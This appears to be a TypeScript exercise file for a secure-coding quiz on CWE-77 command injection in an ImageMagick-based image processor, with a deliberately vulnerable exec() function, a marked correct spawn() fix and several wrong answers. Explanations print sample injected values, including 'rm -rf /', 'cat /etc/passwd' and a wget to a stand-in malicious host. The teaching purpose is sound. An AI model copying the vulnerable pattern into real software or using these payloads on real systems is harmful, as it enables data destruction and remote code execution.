import type { Exercise } from '@/data/exercises'

/**
 * CWE-77 exercise: Image processing command injection
 * Based on image manipulation tools that execute system commands
 */
export const cwe77ImageProcessor: Exercise = {
  cweId: 'CWE-77',
  name: 'Command Injection - Image Processing Service',

  vulnerableFunction: `function processImageFile(inputFile, outputFile, operation, options) {
  const { exec } = require('child_process');

  // Validate operation type
  const validOperations = ['resize', 'crop', 'rotate', 'convert'];
  if (!validOperations.includes(operation)) {
    throw new Error('Invalid operation');
  }

  let cmd;

  switch (operation) {
    case 'resize':
      const dimensions = options.dimensions || '800x600';
      cmd = \`convert "\${inputFile}" -resize \${dimensions} "\${outputFile}"\`;
      break;
    case 'crop':
      const cropBox = options.cropBox || '100x100+0+0';
      cmd = \`convert "\${inputFile}" -crop \${cropBox} "\${outputFile}"\`;
      break;
    case 'rotate':
      const angle = options.angle || 90;
      cmd = \`convert "\${inputFile}" -rotate \${angle} "\${outputFile}"\`;
      break;
    case 'convert':
      const format = options.format || 'jpg';
      cmd = \`convert "\${inputFile}" "\${outputFile}.\${format}"\`;
      break;
  }

  return new Promise((resolve, reject) => {
    exec(cmd, { timeout: 60000 }, (error, stdout, stderr) => {
      if (error) {
        reject(\`Image processing failed: \${error.message}\`);
        return;
      }

      resolve({
        success: true,
        inputFile: inputFile,
        outputFile: outputFile,
        operation: operation,
        command: cmd
      });
    });
  });
}`,

  vulnerableLine: `cmd = \`convert "\${inputFile}" -resize \${dimensions} "\${outputFile}"\`;`,

  options: [
    {
      code: `function processImageFile(inputFile, outputFile, operation, options) {
  const { spawn } = require('child_process');
  const path = require('path');

  // Validate operation
  const validOperations = ['resize', 'rotate'];
  if (!validOperations.includes(operation)) {
    throw new Error('Invalid operation');
  }

  // Validate file paths
  const safeInputFile = path.basename(inputFile);
  const safeOutputFile = path.basename(outputFile);

  if (!/\\.(jpg|jpeg|png|gif)$/i.test(safeInputFile)) {
    throw new Error('Invalid input file type');
  }

  return new Promise((resolve, reject) => {
    let args;

    if (operation === 'resize') {
      const width = parseInt(options.width) || 800;
      const height = parseInt(options.height) || 600;
      if (width < 1 || width > 5000 || height < 1 || height > 5000) {
        throw new Error('Invalid dimensions');
      }
      args = [safeInputFile, '-resize', \`\${width}x\${height}\`, safeOutputFile];
    } else if (operation === 'rotate') {
      const angle = parseInt(options.angle) || 90;
      if (![90, 180, 270].includes(angle)) {
        throw new Error('Invalid rotation angle');
      }
      args = [safeInputFile, '-rotate', angle.toString(), safeOutputFile];
    }

    const convert = spawn('convert', args);
    convert.on('close', (code) => {
      if (code === 0) {
        resolve({ success: true, outputFile: safeOutputFile });
      } else {
        reject('Image processing failed');
      }
    });
  });
}`,
      correct: true,
      explanation: `Correct! Using spawn() with validated arguments prevents command injection. File paths are sanitized, parameters are validated and converted to safe types, and arguments are passed as an array.`
    },
    // Image processing command injection vulnerabilities
    {
      code: `cmd = \`convert "\${inputFile}" -resize \${dimensions} "\${outputFile}"\`;
exec(cmd);`,
      correct: false,
      explanation: 'ImageMagick command with unvalidated parameters. Dimensions like "800x600; rm -rf /" or filenames with injection can execute arbitrary commands during image processing.'
    },
    {
      code: `cmd = \`convert "\${inputFile}" -crop \${cropBox} "\${outputFile}"\`;
exec(cmd);`,
      correct: false,
      explanation: 'Crop parameters allow injection. Malicious crop boxes like "100x100+0+0; cat /etc/passwd" can execute commands alongside image operations.'
    },
    {
      code: `const angle = options.angle || 90;
cmd = \`convert "\${inputFile}" -rotate \${angle} "\${outputFile}"\`;
exec(cmd);`,
      correct: false,
      explanation: 'Rotation angle parameter enables injection. Angles like "90; wget malicious.com/shell.sh" can download and execute malicious scripts during image rotation.'
    },
    {
      code: `cmd = \`ffmpeg -i "\${inputFile}" -vf scale=\${width}:\${height} "\${outputFile}"\`;
exec(cmd);`,
      correct: false,
      explanation: 'FFmpeg video processing with unvalidated scale parameters. Width/height values containing shell metacharacters can inject commands into video processing pipelines.'
    },
    {
      code: `if (!inputFile.includes('/')) {
    cmd = \`convert "\${inputFile}" "\${outputFile}"\`;
    exec(cmd);
}`,
      correct: false,
      explanation: 'Path traversal protection does not prevent command injection. File names can still contain quotes, semicolons, and other shell metacharacters that break command execution.'
    },
    {
      code: `const safeInput = inputFile.replace(/"/g, '\\\\"');
cmd = \`convert "\${safeInput}" "\${outputFile}"\`;
exec(cmd);`,
      correct: false,
      explanation: 'Quote escaping only addresses one injection vector. Backticks, command substitution, and semicolons can still be used to inject commands.'
    },
    {
      code: `const cmd = \`identify -format "%w %h" "\${inputFile}" && convert "\${inputFile}" "\${outputFile}"\`;
exec(cmd);`,
      correct: false,
      explanation: 'Command chaining with && creates multiple injection points. Both identify and convert commands can be manipulated through filename injection.'
    },
    {
      code: `cmd = \`convert "\${inputFile}" -quality \${quality} "\${outputFile}"\`;
if (quality >= 1 && quality <= 100) {
    exec(cmd);
}`,
      correct: false,
      explanation: 'Quality validation after command construction is too late. The command string has already been built with potentially malicious quality values.'
    },
    {
      code: `const tempFile = '/tmp/' + Math.random().toString(36);
cmd = \`convert "\${inputFile}" \${tempFile} && mv \${tempFile} "\${outputFile}"\`;
exec(cmd);`,
      correct: false,
      explanation: 'Complex command sequences with temporary files create multiple injection opportunities. Both convert and mv commands can be manipulated through filename parameters.'
    },
    {
      code: `const cmd = ['convert', inputFile, '-resize', dimensions, outputFile];
exec(cmd.join(' '));`,
      correct: false,
      explanation: 'Array joining does not sanitize individual elements. Malicious content in array elements creates injection vulnerabilities when joined into a shell command string.'
    }
  ]
}